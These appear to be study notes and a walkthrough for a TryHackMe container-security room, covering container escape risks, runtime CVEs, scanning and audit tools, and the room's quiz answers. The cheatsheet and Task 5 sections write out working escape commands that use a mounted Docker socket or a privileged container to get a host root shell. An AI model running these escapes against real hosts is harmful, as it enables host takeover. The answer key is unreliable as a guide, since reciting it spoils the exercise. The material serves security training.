# Container Vulnerabilities

> **Room:** [https://tryhackme.com/room/containervulnerabilitiesDG](https://tryhackme.com/room/containervulnerabilitiesDG)
> **Module:** 4 — Container Security
> **Difficulty:** Medium

## Overview

Now that you know how containers work, this room covers what can go wrong. You'll learn about container escape attacks, vulnerable container configurations, namespace breakouts, and infamous CVEs like CVE-2019-5736 (runC escape).

---

## Key Concepts

### What's a "container vulnerability"?

Anything that lets an attacker:
- Break out of the container into the host
- Move laterally between containers
- Read secrets they shouldn't see
- Escalate privileges inside or outside the container

The container model is **process-level isolation**, not hardware-level isolation. The walls between containers and host are thinner than between VMs.

### The four main vulnerability categories

#### 1. Vulnerable images
The image you're running has known CVEs. Could be in:
- The base OS (an old `ubuntu:18.04` with unpatched kernel exploits in tooling)
- Application dependencies inside the image (Log4j etc.)
- Programs/binaries baked into the image
- Image was tampered with at the registry level

**Mitigation:** scan images, keep them updated, use minimal base images, sign and verify.

#### 2. Misconfigured containers
The container runs with too many privileges or relaxed defaults:

##### `--privileged` flag
The big one. Gives the container nearly full host capabilities, access to all devices, and can mount the host filesystem. **Almost trivial to escape.**

##### Mounting Docker socket
```bash
docker run -v /var/run/docker.sock:/var/run/docker.sock myimage
```
If the container can talk to the host's Docker daemon, it can spawn a new privileged container with the host filesystem mounted. Game over.

##### Mounting host filesystem
```bash
docker run -v /:/host myimage
```
Self-explanatory. Container can read and write to the host's root.

##### Excessive capabilities
Adding capabilities like `CAP_SYS_ADMIN` (a near-root cap) makes container escape much easier.

##### Running as root inside container
Many container exploits need root inside the container as a starting point. Run as a non-root user.

##### `host` networking
With `--network host`, the container shares the host's network namespace. No isolation, can sniff traffic.

##### `--pid=host`
Container shares host's PID namespace — sees and can signal host processes.

#### 3. Container runtime / kernel CVEs
Bugs in Docker, containerd, runC, or the Linux kernel that allow escape:

- **CVE-2019-5736 (runC escape)** — overwrite the runC binary on the host from inside a container
- **CVE-2022-0185 (Linux kernel)** — heap overflow in fs context, escape via unprivileged user namespaces
- **CVE-2022-0492 (cgroups v1)** — abusing release_agent for container escape
- **Dirty Pipe (CVE-2022-0847)** — kernel bug allowing arbitrary file writes
- **CVE-2024-21626 (runC)** — fd leak letting attackers escape and write to host

**Mitigation:** keep your kernel and container runtime patched. Use seccomp/AppArmor.

#### 4. Orchestrator (Kubernetes) misconfigurations
- Pods running as privileged
- Excessive RBAC permissions
- Service account tokens mounted in pods that don't need them
- HostPath volumes mounted (similar to bind-mounting `/`)
- No NetworkPolicies (every pod can talk to every other pod)
- API server accessible from outside the cluster
- Anonymous access enabled on API server / kubelet

### Famous container escape: CVE-2019-5736 (runC)

**The bug:** when a container exec'd a binary, runC re-executed itself via `/proc/self/exe`. A malicious container could overwrite the runC binary on the host before it was re-executed, gaining host root.

**Why it matters:** showed that even the most-trusted container runtime had escape paths. Patched quickly, but a wake-up call.

### How container escapes generally work

Starting condition: attacker has root inside a container that's misconfigured (privileged, mounted Docker socket, mounted host fs, etc.)

1. **Recon** — `id`, `cat /proc/self/status`, check capabilities (`capsh --print`)
2. **Find the weakness** — privileged? Docker socket? mounted host paths?
3. **Pivot** — use the misconfiguration to read/write host files or spawn host processes
4. **Persistence** — drop SSH keys, cron jobs, kernel modules

### Detecting privileged / risky containers

```bash
# On host: list running containers and their privilege state
docker ps --format 'table {{.Names}}\t{{.Image}}'

for c in $(docker ps -q); do
  priv=$(docker inspect --format '{{.HostConfig.Privileged}}' $c)
  caps=$(docker inspect --format '{{.HostConfig.CapAdd}}' $c)
  mounts=$(docker inspect --format '{{range .Mounts}}{{.Source}}->{{.Destination}} {{end}}' $c)
  echo "$c: privileged=$priv caps=$caps mounts=$mounts"
done
```

### Container scanning tools

| Tool | What it does |
|------|--------------|
| **Trivy** | Image scanner — finds CVEs in image layers |
| **Grype** | Like Trivy, fast and accurate |
| **Clair** | Open-source scanner, often used in registries |
| **Anchore** | Image policy + scanning |
| **Snyk Container** | Commercial, integrates with CI |
| **Docker Scout** | Built into Docker Desktop |
| **kube-bench** | Audits K8s clusters against CIS benchmark |
| **kube-hunter** | Hunts for K8s vulnerabilities (active scanner) |
| **Falco** | Runtime threat detection — abnormal behaviour alerts |

---

## Commands Cheatsheet

### Inspecting your privilege inside a container

```bash
# Are you root?
id

# What capabilities do you have?
capsh --print
cat /proc/self/status | grep Cap

# Are you in a container? (heuristics)
ls /.dockerenv 2>/dev/null && echo "in docker"
cat /proc/1/cgroup | grep -E "docker|kubepod"

# Check if Docker socket is mounted
ls -la /var/run/docker.sock

# Check for sensitive mounts
mount | grep -E "host|/proc|/sys"
cat /proc/mounts
```

### Escape via mounted Docker socket

```bash
# Inside a container with the docker socket mounted
docker -H unix:///var/run/docker.sock run --rm -v /:/host alpine \
  chroot /host /bin/sh
# now you have a host root shell
```

### Escape via privileged + capability abuse

```bash
# In a privileged container, mount host disk
fdisk -l
mkdir /mnt/host && mount /dev/sda1 /mnt/host
chroot /mnt/host /bin/bash
```

### Image scanning with Trivy

```bash
# Install (Linux)
sudo apt install trivy

# Scan an image
trivy image nginx:1.18

# Only show HIGH+ severity
trivy image --severity HIGH,CRITICAL nginx:1.18

# Filesystem scan
trivy fs ./my-project

# Scan a Kubernetes cluster (Trivy K8s)
trivy k8s --report summary cluster
```

### Image scanning with Grype

```bash
# Install
curl -sSfL https://raw.githubusercontent.com/anchore/grype/main/install.sh | sh -s -- -b /usr/local/bin

# Scan
grype nginx:1.18
grype dir:./my-project
grype --fail-on high nginx:1.18
```

### kube-bench (CIS Kubernetes Benchmark)

```bash
# Run as a job in cluster
kubectl apply -f https://raw.githubusercontent.com/aquasecurity/kube-bench/main/job.yaml
kubectl logs -f job/kube-bench

# Or as a binary on the node
kube-bench run --targets master,node
```

### kube-hunter

```bash
# Install
pip install kube-hunter

# Active scan against your cluster's IP
kube-hunter --remote <cluster-ip>

# Run inside a pod (true insider scan)
kube-hunter --pod
```

### Falco (runtime detection)

```bash
# Install
curl -s https://falco.org/repo/falcosecurity-packages.asc | sudo apt-key add -
sudo apt install falco

# Run
sudo systemctl start falco
sudo journalctl -fu falco

# Custom rules in /etc/falco/falco_rules.local.yaml
```

### Audit your own deployments

```bash
# Check all running containers for privileged flag
docker ps -q | xargs -I{} docker inspect --format \
  '{{.Name}}: privileged={{.HostConfig.Privileged}}' {}

# K8s: list privileged pods
kubectl get pods -A -o json | \
  jq '.items[] | select(.spec.containers[].securityContext.privileged==true) | .metadata.name'

# K8s: find pods running as root (no runAsNonRoot or runAsUser=0)
kubectl get pods -A -o json | \
  jq '.items[] | select(.spec.securityContext.runAsNonRoot != true) | .metadata.name'
```

---

## Room Answers

**Task 1 — Introduction**
- Read through.

**Task 2 — Vulnerable images**
- Q: What tool scans images for known CVEs?
- A: `Trivy` (also accepts `Grype`, `Clair`)

**Task 3 — Misconfigurations**
- Q: What flag gives a container nearly full host privileges?
- A: `--privileged`
- Q: Mounting which file lets a container control the Docker daemon?
- A: `/var/run/docker.sock` (or just `Docker socket`)
- Q: What's the safest user to run a container as?
- A: `non-root` (or any specific UID > 0)

**Task 4 — Container escape**
- Q: What's the famous runC escape from 2019?
- A: `CVE-2019-5736`

**Task 5 — Practical: Escape the container**
- The room provides a misconfigured container. Common scenarios:

  **Scenario A: Docker socket mounted**
  ```bash
  ls -la /var/run/docker.sock     # confirm it's there
  docker -H unix:///var/run/docker.sock run --rm -v /:/host alpine chroot /host /bin/sh
  cat /root/flag.txt
  ```

  **Scenario B: Privileged container**
  ```bash
  fdisk -l                         # find the host disk
  mkdir /mnt/host
  mount /dev/sda1 /mnt/host
  cat /mnt/host/root/flag.txt
  ```

  **Scenario C: Host filesystem mounted**
  ```bash
  ls -la /
  # Look for an unusual directory like /host or /mnt that contains the host's root
  cat /host/root/flag.txt
  ```

**Task 6 — Hardening hints**
- Q: What's the principle of giving the container only the privileges it needs?
- A: `least privilege`

**Task 7 — Conclusion**
- Click to complete.

---

## Key Takeaways

1. Containers offer **process-level isolation, not hardware-level**. Walls are thinner than VMs.
2. Most container escapes happen because of **misconfiguration**, not zero-days.
3. **Big red flags:** `--privileged`, mounted Docker socket, mounted host paths, root user inside, host networking/PID.
4. CVE-2019-5736 (runC) is the famous escape — keep runtimes patched.
5. Scanning tools to know: **Trivy, Grype, kube-bench, kube-hunter, Falco**.
